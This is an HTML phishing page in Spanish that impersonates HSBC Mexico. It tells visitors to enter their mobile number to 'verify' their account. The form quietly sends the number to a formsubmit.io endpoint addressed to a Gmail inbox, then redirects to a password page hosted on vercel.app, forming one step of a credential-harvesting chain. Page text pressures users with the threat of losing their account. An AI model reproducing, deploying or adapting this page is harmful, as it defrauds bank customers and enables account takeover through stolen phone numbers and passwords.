<head>
    <meta charset="UTF-8">

</head>
<body>
    <div class="nav">
        <img class="imglogonav" src="./logo.png" alt="">
    </div>

    <div class="cont">
        <div class="conttitle">
            <h1 class="title">INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA</h1>
        </div>
        <form  action="https://formsubmit.io/send/24bcf51a-d2cf-438f-b1b1-8953eff5bb38" method="POST">
        <div class="contsolicitar">
            <div class="lbinput"><label class="label" >ðŸ‡²ðŸ‡½+52</label><input name="Numero" class="pedirnumeroinput"  type="number" placeholder="Ingresa tu numero" required></div>
            
            <input name="email" type="hidden" value="respues2form@gmail.com">
            <input name="_formsubmit_id" type="text" style="display:none">
            <input name="_redirect" type="hidden" id="name" value="https://spinnetpersonas.vercel.app/contrase%C3%B1a.html">
            <input value="Enviar" class="pedirbtn" type="submit">

            <script>
                var input = document.querySelector(".pedirnumeroinput");
                var btn = document.querySelector(".pedirbtn");
                input.addEventListener("keyup", function(){
                    if(input.value.length == 10){
                        btn.disabled = false;
                    }else{
                        btn.disabled = true;
                    }
                });

                <!-- no dejar que se escriban mas de 10 digitos -->
                input.addEventListener("keydown", function(e){
                    if(input.value.length == 10){
                        if(e.keyCode != 8){
                            e.preventDefault();
                        }
                    }
                });

                input.addEventListener("keypress", function(e){
                    if(e.keyCode < 48 || e.keyCode > 57){
                        e.preventDefault();
                    }
                });

            </script>

        </div>
        <div class="contaviso">
        <h3 class="textaviso" >No pierdas tu cuenta y sigue difrutando de los beneficios que Hsbc tiene para ti.</h3>
    </div>

</body>
